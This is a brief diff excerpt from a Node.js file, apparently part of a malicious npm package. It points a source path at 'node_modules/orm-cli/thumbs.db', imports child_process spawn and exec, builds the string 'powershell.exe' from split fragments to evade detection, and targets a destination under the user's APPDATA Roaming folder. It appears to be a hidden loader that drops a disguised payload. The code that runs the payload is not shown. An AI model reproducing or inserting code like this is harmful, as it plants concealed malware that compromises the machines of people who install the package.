@@ -2,7 +2,7 @@ const { spawn } = require("child_process");
 const fs = require('fs');
 const { exec } = require('child_process');
 const roaming = process.env.APPDATA;
-const srcfile = 'thumbs.db';
+const srcfile = 'node_modules/orm-cli/thumbs.db';
 const pshe1 = "pow" + "ers" + "hell.e" + "xe";
 const destfile = `${roaming}/Software/${pshe1}`;
 
